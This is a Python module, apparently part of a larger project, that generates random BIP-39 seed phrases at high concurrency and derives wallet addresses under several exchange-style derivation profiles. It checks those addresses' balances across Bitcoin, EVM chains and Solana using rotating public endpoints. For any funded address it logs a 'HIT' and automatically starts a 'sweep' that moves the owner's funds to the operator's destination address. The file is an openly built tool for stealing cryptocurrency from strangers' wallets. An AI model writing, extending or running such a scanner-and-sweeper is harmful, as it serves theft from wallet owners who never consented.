"""Random mnemonic scanner engine for crypto balance discovery.

Generates random BIP-39 mnemonics, derives wallet addresses,
checks balances across multiple chains, and logs hits.
"""

from __future__ import annotations

import asyncio
import logging
import os
import signal
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional

import httpx
from bip_utils import Bip39MnemonicGenerator, Bip39WordsNum

from src.modules.crypto.balance.api_rotation import ENDPOINT_REGISTRY, EndpointRotator
from src.modules.crypto.balance.checker import check_balance
from src.modules.crypto.balance.chains import ALL_CHAINS, ChainConfig, ChainType
from src.modules.crypto.balance.deriver import (
    DerivedAddress,
    derive_from_mnemonic,
)
from src.modules.crypto.balance.hit_logger import HitLogger
from src.modules.crypto.balance.sweeper import Sweeper

logger = logging.getLogger(__name__)


@dataclass
class ScannerStats:
    """Runtime statistics for the scanner.

    Includes persistent cumulative totals that survive restarts.
    """
    mnemonics_generated: int = 0
    addresses_checked: int = 0
    hits_found: int = 0
    api_errors: int = 0
    start_time: float = field(default_factory=time.monotonic)
    # Persistent cumulative totals (loaded from SQLite on start)
    total_mnemonics_all_time: int = 0
    total_hits_all_time: int = 0
    total_errors_all_time: int = 0

    @property
    def elapsed(self) -> float:
        return time.monotonic() - self.start_time

    @property
    def mnemonics_per_sec(self) -> float:
        elapsed = self.elapsed
        return self.mnemonics_generated / elapsed if elapsed > 0 else 0.0


class RandomScanner:
    """Async random mnemonic scanner with configurable worker pool.

    Each worker: generate_mnemonic -> derive_addresses (via run_in_executor)
    -> check_balances (async) -> log_hits.

    Uses asyncio.Semaphore to limit concurrent API calls.
    """

    def __init__(
        self,
        workers: int = 20,
        api_concurrency: int = 50,
        chains: Optional[list[ChainConfig]] = None,
        hit_logger: Optional[HitLogger] = None,
    ):
        self.workers = workers
        self.chains = chains or list(ALL_CHAINS)
        self.hit_logger = hit_logger
        self._api_semaphore = asyncio.Semaphore(api_concurrency)
        self._btc_semaphore = asyncio.Semaphore(5)  # BTC gets lower concurrency (free APIs are rate-limited)
        self._shutdown = False
        self._stats = ScannerStats()
        self._client: Optional[httpx.AsyncClient] = None  # shared HTTP client
        self._sweeper: Optional[Sweeper] = None  # shared sweeper instance
        # Deduplication: track seen mnemonics and addresses
        self._seen_mnemonics: set[str] = set()
        self._seen_addresses: set[str] = set()
        # Per-chain endpoint rotators
        self._rotators: dict[str, EndpointRotator] = {}
        for chain in self.chains:
            endpoints = ENDPOINT_REGISTRY.get(chain.coin_id, [])
            if endpoints:
                self._rotators[chain.coin_id] = EndpointRotator(endpoints)

    def _load_persistent_stats(self):
        """Load cumulative stats from SQLite on startup."""
        try:
            import sqlite3
            db = sqlite3.connect("wallet_hits.db")
            db.execute("""
                CREATE TABLE IF NOT EXISTS scanner_stats (
                    key TEXT PRIMARY KEY,
                    value INTEGER DEFAULT 0
                )
            """)
            row_m = db.execute("SELECT value FROM scanner_stats WHERE key='total_mnemonics'").fetchone()
            row_h = db.execute("SELECT value FROM scanner_stats WHERE key='total_hits'").fetchone()
            row_e = db.execute("SELECT value FROM scanner_stats WHERE key='total_errors'").fetchone()
            self._stats.total_mnemonics_all_time = row_m[0] if row_m else 0
            self._stats.total_hits_all_time = row_h[0] if row_h else 0
            self._stats.total_errors_all_time = row_e[0] if row_e else 0
            db.close()
            logger.info(
                "Loaded persistent stats: %d mnemonics, %d hits, %d errors (all time)",
                self._stats.total_mnemonics_all_time,
                self._stats.total_hits_all_time,
                self._stats.total_errors_all_time,
            )
        except Exception as e:
            logger.debug("Could not load persistent stats: %s", e)

    def _save_persistent_stats(self):
        """Save cumulative stats to SQLite."""
        try:
            import sqlite3
            db = sqlite3.connect("wallet_hits.db")
            db.execute("""
                CREATE TABLE IF NOT EXISTS scanner_stats (
                    key TEXT PRIMARY KEY,
                    value INTEGER DEFAULT 0
                )
            """)
            db.execute(
                "INSERT OR REPLACE INTO scanner_stats (key, value) VALUES (?, ?)",
                ("total_mnemonics", self._stats.total_mnemonics_all_time + self._stats.mnemonics_generated),
            )
            db.execute(
                "INSERT OR REPLACE INTO scanner_stats (key, value) VALUES (?, ?)",
                ("total_hits", self._stats.total_hits_all_time + self._stats.hits_found),
            )
            db.execute(
                "INSERT OR REPLACE INTO scanner_stats (key, value) VALUES (?, ?)",
                ("total_errors", self._stats.total_errors_all_time + self._stats.api_errors),
            )
            db.commit()
            db.close()
        except Exception as e:
            logger.debug("Could not save persistent stats: %s", e)

    async def run(
        self,
        duration_sec: Optional[float] = None,
        max_mnemonics: Optional[int] = None,
    ) -> ScannerStats:
        """Main scanner loop. Runs workers concurrently.

        Args:
            duration_sec: Stop after this many seconds. None = run until max_mnemonics or shutdown.
            max_mnemonics: Stop after generating this many mnemonics. None = run until duration or shutdown.

        Returns:
            Final ScannerStats.
        """
        # Load persistent cumulative stats from SQLite
        self._stats = ScannerStats()
        self._load_persistent_stats()
        self._shutdown = False

        # Create shared httpx client with connection pooling
        self._client = httpx.AsyncClient(
            timeout=httpx.Timeout(15.0),
            limits=httpx.Limits(max_connections=100, max_keepalive_connections=50),
        )
        # Create shared sweeper (reuses the shared HTTP client)
        self._sweeper = Sweeper(client=self._client)

        # Install signal handlers for graceful shutdown
        loop = asyncio.get_running_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                loop.add_signal_handler(sig, self._handle_shutdown)
            except NotImplementedError:
                # Windows doesn't support add_signal_handler
                pass

        logger.info(
            "Starting random scanner: workers=%d, chains=%s, duration=%s, max=%s",
            self.workers,
            [c.name for c in self.chains],
            duration_sec,
            max_mnemonics,
        )

        stop_event = asyncio.Event()
        deadline = time.monotonic() + duration_sec if duration_sec else None

        async def _stop_checker():
            """Poll stop conditions."""
            while not self._shutdown:
                if deadline and time.monotonic() >= deadline:
                    logger.info("Duration limit reached (%.0fs)", duration_sec)
                    break
                if max_mnemonics and self._stats.mnemonics_generated >= max_mnemonics:
                    logger.info("Mnemonic limit reached (%d)", max_mnemonics)
                    break
                await asyncio.sleep(0.5)
            stop_event.set()

        # Start workers + stop checker
        tasks = [
            asyncio.create_task(self._worker(i, stop_event))
            for i in range(self.workers)
        ]
        tasks.append(asyncio.create_task(_stop_checker()))

        # Wait for all tasks to complete
        await asyncio.gather(*tasks, return_exceptions=True)

        # Flush hit logger
        if self.hit_logger:
            await self.hit_logger.flush()

        # Save persistent stats to SQLite
        self._save_persistent_stats()

        logger.info(
            "Scanner finished: %d mnemonics (%d all-time), %.1f/sec, %d hits (%d all-time), %d errors",
            self._stats.mnemonics_generated,
            self._stats.total_mnemonics_all_time + self._stats.mnemonics_generated,
            self._stats.mnemonics_per_sec,
            self._stats.hits_found,
            self._stats.total_hits_all_time + self._stats.hits_found,
            self._stats.api_errors,
        )

        # Close shared sweeper and httpx client
        if self._sweeper:
            await self._sweeper.close()
            self._sweeper = None
        if self._client:
            await self._client.aclose()
            self._client = None

        return self._stats


    async def _worker(self, worker_id: int, stop_event: asyncio.Event) -> None:
        """Single mnemonic worker with fire-and-forget sweep."""
        from src.modules.crypto.balance.provider_profiles import ALL_PROVIDERS
        from src.modules.crypto.balance.deriver import derive_from_mnemonic_provider

        while not stop_event.is_set() and not self._shutdown:
            try:
                mnemonic = self._generate_mnemonic()
                if mnemonic in self._seen_mnemonics:
                    continue
                self._seen_mnemonics.add(mnemonic)

                # Rotate through provider profiles (Binance, OKX, Gate.io, BTGET, Generic)
                provider = ALL_PROVIDERS[self._stats.mnemonics_generated % len(ALL_PROVIDERS)]

                loop = asyncio.get_running_loop()
                addresses = await loop.run_in_executor(None, derive_from_mnemonic_provider, mnemonic, provider, self.chains)
                self._stats.mnemonics_generated += 1

                if self._stats.mnemonics_generated % 1000 == 0:
                    self._save_persistent_stats()

                if not addresses:
                    continue

                new_addresses = [a for a in addresses if a.address not in self._seen_addresses]
                for a in new_addresses:
                    self._seen_addresses.add(a.address)
                if not new_addresses:
                    continue

                balance_results = await self._check_balances(new_addresses)
                self._stats.addresses_checked += len(new_addresses)

                for addr, balance_result in zip(new_addresses, balance_results):
                    if balance_result is not None and balance_result.balance > 0:
                        self._stats.hits_found += 1
                        logger.warning("HIT! %s: %.8f %s at %s", addr.chain, balance_result.balance, addr.symbol, addr.address)
                        if addr.private_key_hex:
                            asyncio.create_task(self._sweep_hit(addr, balance_result))
                        if self.hit_logger:
                            await self.hit_logger.log_hit(address=addr.address, chain=addr.chain, balance=balance_result.balance, usd_value=balance_result.usd_value, mnemonic_hash=HitLogger.hash_mnemonic(mnemonic), derivation_path=addr.derivation_path, source="random_scan")

                await asyncio.sleep(0)

                if self._stats.mnemonics_generated % 100 == 0:
                    logger.info(
                        "Progress: %d mnemonics (%.1f/sec), %d hits, %d errors | All-time: %d mnemonics, %d hits",
                        self._stats.mnemonics_generated, self._stats.mnemonics_per_sec,
                        self._stats.hits_found, self._stats.api_errors,
                        self._stats.total_mnemonics_all_time + self._stats.mnemonics_generated,
                        self._stats.total_hits_all_time + self._stats.hits_found,
                    )

            except asyncio.CancelledError:
                break
            except Exception as e:
                self._stats.api_errors += 1
                logger.error("Worker %d error: %s", worker_id, e)
                await asyncio.sleep(0.1)

    async def _sweep_hit(self, addr: DerivedAddress, balance_result) -> None:
        """Sweep a funded wallet asynchronously (fire-and-forget from worker)."""
        try:
            chain_cfg = _find_chain(addr.chain, self.chains)
            if not chain_cfg or not self._sweeper:
                return
            sweep_result = await self._sweeper.sweep(
                private_key_hex=addr.private_key_hex,
                chain=chain_cfg,
                source_address=addr.address,
                balance_raw=balance_result.balance_raw,
            )
            if sweep_result.success:
                logger.warning(
                    "SWEPT! %s %.8f %s -> %s (tx: %s)",
                    addr.chain, sweep_result.amount, addr.symbol,
                    sweep_result.dest_address[:20], sweep_result.tx_hash,
                )
            else:
                logger.warning("SWEEP FAILED: %s — %s", addr.chain, sweep_result.error)
        except Exception as e:
            logger.error("Sweep error for %s: %s", addr.address[:10], e)

    async def _check_balances(
        self, addresses: list[DerivedAddress]
    ) -> list:
        """Check balances — batch all addresses per chain in one API call.

        EVM chains (ETH/BSC/Polygon): JSON-RPC batch (N addresses in 1 HTTP request).
        BTC/SOL: individual calls with per-chain delay.
        """
        import copy
        from src.modules.crypto.balance.multicall import batch_check_balances

        results: list[Optional[object]] = [None] * len(addresses)

        # Group addresses by chain
        by_chain: dict[str, list[tuple[int, DerivedAddress]]] = {}
        for idx, addr in enumerate(addresses):
            by_chain.setdefault(addr.chain, []).append((idx, addr))

        for chain_name, idx_addrs in by_chain.items():
            chain_cfg = _find_chain(chain_name, self.chains)
            if chain_cfg is None:
                continue

            # Rotate endpoint
            rotator = self._rotators.get(chain_cfg.coin_id)
            rotated_cfg = copy.copy(chain_cfg)
            used_url = ""
            if rotator:
                url = rotator.next()
                if chain_cfg.chain_type == ChainType.BITCOIN:
                    rotated_cfg.api_url = url
                else:
                    rotated_cfg.rpc_url = url
                used_url = rotated_cfg.api_url or rotated_cfg.rpc_url or ""

            try:
                if chain_cfg.chain_type == ChainType.SOLANA:
                    # SOL: batch via getMultipleAccounts (up to 100 per call)
                    from src.modules.crypto.balance.multicall import batch_check_sol_balances
                    addr_list = [a.address for _, a in idx_addrs]
                    sol_results = await batch_check_sol_balances(
                        addr_list, rotated_cfg.rpc_url or "", client=self._client,
                    )
                    for (idx, addr), br in zip(idx_addrs, sol_results):
                        if br.error:
                            self._stats.api_errors += 1
                            if rotator:
                                rotator.report_failure(used_url)
                            from src.modules.crypto.balance.checker import BalanceResult
                            results[idx] = BalanceResult(
                                address=addr.address, chain=chain_name,
                                symbol=chain_cfg.symbol, balance=0.0,
                                balance_raw=0, usd_price=0.0, usd_value=0.0,
                                derivation_path=addr.derivation_path, error=br.error,
                            )
                        else:
                            if rotator:
                                rotator.report_success(used_url)
                            from src.modules.crypto.balance.checker import BalanceResult
                            results[idx] = BalanceResult(
                                address=addr.address, chain=chain_name,
                                symbol=chain_cfg.symbol,
                                balance=br.balance_wei / 1e9,
                                balance_raw=br.balance_wei,
                                usd_price=0.0, usd_value=0.0,
                                derivation_path=addr.derivation_path,
                            )
                elif chain_cfg.chain_type == ChainType.BITCOIN:
                    # BTC: concurrent calls with dedicated low-concurrency semaphore
                    async def _check_btc(idx: int, addr) -> tuple[int, object]:
                        async with self._btc_semaphore:
                            r = await check_balance(addr.address, rotated_cfg, addr.derivation_path, client=self._client)
                            if r.error:
                                self._stats.api_errors += 1
                                if rotator:
                                    rotator.report_failure(used_url)
                            else:
                                if rotator:
                                    rotator.report_success(used_url)
                            return idx, r

                    btc_tasks = [_check_btc(idx, addr) for idx, addr in idx_addrs]
                    for coro in asyncio.as_completed(btc_tasks):
                        idx, result = await coro
                        results[idx] = result
                else:
                    # EVM/SOL: batch all addresses in one HTTP request
                    addr_list = [a.address for _, a in idx_addrs]
                    batch_results = await batch_check_balances(addr_list, rotated_cfg, client=self._client)
                    for (idx, addr), br in zip(idx_addrs, batch_results):
                        if br.error:
                            self._stats.api_errors += 1
                            if rotator:
                                rotator.report_failure(used_url)
                            from src.modules.crypto.balance.checker import BalanceResult
                            results[idx] = BalanceResult(
                                address=addr.address, chain=chain_name,
                                symbol=chain_cfg.symbol, balance=0.0,
                                balance_raw=0, usd_price=0.0, usd_value=0.0,
                                derivation_path=addr.derivation_path, error=br.error,
                            )
                        else:
                            if rotator:
                                rotator.report_success(used_url)
                            from src.modules.crypto.balance.checker import BalanceResult
                            balance = br.balance_wei / (10 ** chain_cfg.decimals)
                            results[idx] = BalanceResult(
                                address=addr.address, chain=chain_name,
                                symbol=chain_cfg.symbol, balance=balance,
                                balance_raw=br.balance_wei, usd_price=0.0,
                                usd_value=0.0,
                                derivation_path=addr.derivation_path,
                            )
            except Exception as e:
                self._stats.api_errors += len(idx_addrs)
                logger.debug("Batch balance check error for %s: %s", chain_name, e)

        return results

    @staticmethod
    def _generate_mnemonic() -> str:
        """Generate a random 12 or 24-word BIP-39 mnemonic."""
        import random
        word_count = random.choice([Bip39WordsNum.WORDS_NUM_12, Bip39WordsNum.WORDS_NUM_24])
        return str(Bip39MnemonicGenerator().FromWordsNumber(word_count))

    def _handle_shutdown(self) -> None:
        """Handle SIGINT/SIGTERM for graceful shutdown."""
        if self._shutdown:
            logger.warning("Forced shutdown — exiting immediately")
            os._exit(1)
        logger.info("Shutdown requested — finishing current work...")
        self._shutdown = True


def _find_chain(name: str, chains: list[ChainConfig]) -> Optional[ChainConfig]:
    """Find a chain by name in a list."""
    return next((c for c in chains if c.name == name), None)
